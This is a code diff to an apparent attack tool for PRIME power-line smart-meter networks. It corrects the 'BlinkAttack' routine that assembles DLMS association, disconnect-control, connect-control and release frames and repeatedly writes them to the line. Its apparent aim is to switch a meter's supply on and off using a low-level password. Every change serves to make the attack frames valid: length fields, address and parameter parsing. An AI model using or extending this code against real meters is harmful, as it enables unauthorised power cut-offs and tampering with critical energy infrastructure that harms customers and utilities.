@@ -57,10 +57,9 @@ BlinkAttack::BlinkAttack(QString const attackName,
                          PLCTool::StringParams const &params,
                          PLCTool::PrimeAdapter *adapter, QObject *parent)
     : Attack(attackName, adapter, parent) {
-  std::string snaString = params["SNA"].asString();
-  this->sna = std::vector<uint8_t>(snaString.begin(), snaString.end());
-  this->nid = params["NID"].asULong();
-  this->lcid = params["LCID"].asULong();
+  this->sna = params["SNA"].asByteVector();
+  this->nid = params["NID"].asHexULong();
+  this->lcid = params["LCID"].asHexULong();
   this->level = params["Switch level"].asInt();
   this->authenticationLevel = DLMS_AUTHENTICATION_LOW;
   this->password = params["Password"].asString();
@@ -74,7 +73,6 @@ BlinkAttack::BlinkAttack(QString const attackName,
   this->cancelled = false;
 
   this->frame = new PLCTool::PrimeFrame(this->sna.data());
-  this->composeAARQ();
 
   this->connectAll();
   this->state = IDLE;
@@ -125,7 +123,6 @@ void BlinkAttack::composeAARQ(void) {
 
   this->frame->PDU.PKT.PRIO = 0x2;
   this->frame->PDU.PKT.NAD = 0x1;
-  this->frame->PDU.PKT.LEN = 0;
   this->frame->PDU.PKT.LNID = this->nid & 0x3fff;
   this->frame->PDU.PKT.SID = this->nid >> 14;
   this->frame->PDU.PKT.LCID_CTYPE = this->lcid;
@@ -162,10 +159,11 @@ void BlinkAttack::composeAARQ(void) {
   aarq.setUserInformation(initiateRequest.getBytes());
 
   this->frame->PDU.DATA = aarq.getBytes();
+  this->frame->PDU.PKT.LEN = aarq.getSize() + 7;
 
   this->frame->PDU.CL.TYPE = 0x90;
   this->frame->PDU.CL.SRC = 1;
-  this->frame->PDU.CL.DEST = 1;
+  this->frame->PDU.CL.DEST = 2;
 }
 
 void BlinkAttack::composeDisconnect(void) {
@@ -179,7 +177,6 @@ void BlinkAttack::composeDisconnect(void) {
 
   this->frame->PDU.PKT.PRIO = 0x2;
   this->frame->PDU.PKT.NAD = 0x1;
-  this->frame->PDU.PKT.LEN = 0;
   this->frame->PDU.PKT.LNID = this->nid & 0x3fff;
   this->frame->PDU.PKT.SID = this->nid >> 14;
   this->frame->PDU.PKT.LCID_CTYPE = this->lcid;
@@ -207,6 +204,7 @@ void BlinkAttack::composeDisconnect(void) {
   disconnectControlRequest.setMethodInvocationParameters(parameters);
 
   this->frame->PDU.DATA = disconnectControlRequest.getBytes();
+  this->frame->PDU.PKT.LEN = disconnectControlRequest.getSize() + 7;
 
   this->frame->PDU.CL.TYPE = 0x90;
   this->frame->PDU.CL.SRC = 1;
@@ -224,7 +222,6 @@ void BlinkAttack::composeConnect(void) {
 
   this->frame->PDU.PKT.PRIO = 0x2;
   this->frame->PDU.PKT.NAD = 0x1;
-  this->frame->PDU.PKT.LEN = 0;
   this->frame->PDU.PKT.LNID = this->nid & 0x3fff;
   this->frame->PDU.PKT.SID = this->nid >> 14;
   this->frame->PDU.PKT.LCID_CTYPE = this->lcid;
@@ -250,6 +247,7 @@ void BlinkAttack::composeConnect(void) {
   parameters.insert(0, PLCTool::DataInteger(0));
 
   this->frame->PDU.DATA = connectControlRequest.getBytes();
+  this->frame->PDU.PKT.LEN = connectControlRequest.getSize() + 7;
 
   this->frame->PDU.CL.TYPE = 0x90;
   this->frame->PDU.CL.SRC = 1;
@@ -267,7 +265,6 @@ void BlinkAttack::composeRelease(void) {
 
   this->frame->PDU.PKT.PRIO = 0x2;
   this->frame->PDU.PKT.NAD = 0x1;
-  this->frame->PDU.PKT.LEN = 0;
   this->frame->PDU.PKT.LNID = this->nid & 0x3fff;
   this->frame->PDU.PKT.SID = this->nid >> 14;
   this->frame->PDU.PKT.LCID_CTYPE = this->lcid;
@@ -283,6 +280,7 @@ void BlinkAttack::composeRelease(void) {
   rlrq.setReason(DLMS_RELEASE_REQUEST_REASON_NORMAL);
 
   this->frame->PDU.DATA = rlrq.getBytes();
+  this->frame->PDU.PKT.LEN = rlrq.getSize() + 7;
 
   this->frame->PDU.CL.TYPE = 0x90;
   this->frame->PDU.CL.SRC = 1;
@@ -346,6 +344,7 @@ void BlinkAttack::onMessageTime(void) {
 
     emit this->attackStatus(status);
 
+    this->composeAARQ();
     this->adapter->writeFrame(this->frame->serialize());
 
     pktId = (pktId + 1) % 0x3f;
